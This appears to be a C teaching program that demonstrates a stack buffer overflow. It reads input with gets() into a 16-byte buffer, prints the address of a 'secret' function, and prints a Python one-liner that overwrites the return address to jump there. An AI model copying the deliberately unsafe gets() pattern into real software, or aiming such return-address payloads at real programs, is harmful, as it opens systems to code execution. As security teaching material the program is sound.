#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// SECRET FUNCTION - This should never be called normally!
void secret_function() {
    printf("\n");
    printf("╔════════════════════════════════════════╗\n");
    printf("║  *** SECRET FUNCTION ACTIVATED! ***   ║\n");
    printf("║                                        ║\n");
    printf("║  You have successfully exploited a    ║\n");
    printf("║  buffer overflow to call a function  ║\n");
    printf("║  that was never meant to be called!   ║\n");
    printf("║                                        ║\n");
    printf("║  This demonstrates return address     ║\n");
    printf("║  overwrite attack via buffer overflow.║\n");
    printf("╚════════════════════════════════════════╝\n");
    printf("\n");
    exit(0);  // Exit to prevent further execution issues
}

// Function that is vulnerable to buffer overflow
void vulnerable_function() {
    char buffer[16];  // Small buffer - only 16 bytes
    
    printf("Secret function address: %p\n", (void*)secret_function);
    printf("Buffer address: %p\n", (void*)buffer);
    printf("Enter your input: ");
    fflush(stdout);
    
    // VULNERABLE: gets() doesn't check buffer bounds
    // This will overflow if input is longer than 15 characters (+ null terminator)
    // If we overflow enough, we can overwrite the return address on the stack
    gets(buffer);
    
    printf("\nBuffer contents: %s\n", buffer);
    printf("Function should return normally...\n");
    // If overflow was successful, we won't reach this return
}

int main() {
    void* secret_addr = (void*)secret_function;
    
    printf("=== Buffer Overflow Return Address Overwrite ===\n\n");
    printf("This program demonstrates how a buffer overflow can be used\n");
    printf("to overwrite the return address and call a secret function.\n\n");
    printf("The buffer can only hold 15 characters (+ null terminator).\n");
    printf("Goal: Overflow the buffer to overwrite the return address\n");
    printf("      and redirect execution to secret_function().\n\n");
    
    vulnerable_function();
    
    printf("\nNormal execution completed.\n");
    printf("\n=== To exploit this vulnerability ===\n");
    printf("Run this command (adjust offset if needed):\n");
    printf("python3 -c \"import struct,sys; sys.stdout.buffer.write(b'A'*32 + struct.pack('<Q', %p))\" | ./buffer_overflow_demo\n", secret_addr);
    printf("\nOr use the auto_exploit.py script:\n");
    printf("python3 auto_exploit.py\n");
    
    return 0;
}

